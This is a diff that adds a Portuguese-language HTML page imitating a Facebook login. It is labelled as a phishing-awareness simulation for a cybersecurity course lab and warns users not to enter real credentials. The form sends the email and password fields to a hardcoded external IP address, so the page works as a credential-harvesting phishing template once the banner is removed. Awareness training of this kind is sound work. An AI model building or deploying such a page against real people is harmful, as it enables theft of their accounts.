@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noindex, nofollow">
+  <title>Facebook — Simulação Educacional</title>
+
+  <style>
+    * { box-sizing: border-box; }
+
+    body {
+      margin: 0;
+      min-height: 100vh;
+      font-family: Arial, sans-serif;
+      background: #f0f2f5;
+      color: #1c1e21;
+    }
+
+    .aviso {
+      padding: 14px;
+      text-align: center;
+      font-weight: bold;
+      color: #7a1b00;
+      background: #fff3cd;
+      border-bottom: 2px solid #ffcc00;
+    }
+
+    main {
+      min-height: 82vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 60px;
+      padding: 30px;
+    }
+
+    .apresentacao {
+      max-width: 480px;
+    }
+
+    .marca {
+      margin: 0;
+      color: #1877f2;
+      font-size: 56px;
+      letter-spacing: -3px;
+    }
+
+    .cartao {
+      width: 390px;
+      padding: 24px;
+      background: white;
+      border-radius: 10px;
+      box-shadow: 0 2px 12px rgba(0, 0, 0, 0.18);
+    }
+
+    label {
+      display: block;
+      margin: 12px 0 6px;
+      font-weight: bold;
+    }
+
+    input, button {
+      width: 100%;
+      padding: 14px;
+      font-size: 16px;
+      border-radius: 6px;
+    }
+
+    input {
+      border: 1px solid #ccd0d5;
+    }
+
+    button {
+      margin-top: 18px;
+      border: 0;
+      color: white;
+      background: #1877f2;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .orientacao {
+      margin-top: 16px;
+      color: #5f6368;
+      font-size: 13px;
+      text-align: center;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="aviso">
+    AMBIENTE DE TREINAMENTO — NÃO UTILIZE CREDENCIAIS VERDADEIRAS
+  </div>
+
+  <main>
+    <section class="apresentacao">
+      <h1 class="marca">facebook</h1>
+      <h2>Simulação educacional de conscientização sobre phishing.</h2>
+      <p>Laboratório local e autorizado da formação em Cibersegurança.</p>
+    </section>
+
+    <section class="cartao">
+      <form action="http://173.168.100.75/" method="post">
+        <label for="email">Usuário fictício</label>
+        <input
+          id="email"
+          name="email"
+          type="text"
+          placeholder="aluno.lab@example.invalid"
+          autocomplete="off"
+          required
+        >
+
+        <label for="pass">Senha fictícia</label>
+        <input
+          id="pass"
+          name="pass"
+          type="password"
+          placeholder="Digite somente uma senha inventada"
+          autocomplete="off"
+          required
+        >
+
+        <button type="submit">Entrar no ambiente de treinamento</button>
+      </form>
+
+      <p class="orientacao">
+        Teste controlado entre Kali Linux e WINLAB11.
+      </p>
+    </section>
+  </main>
+</body>
+</html>
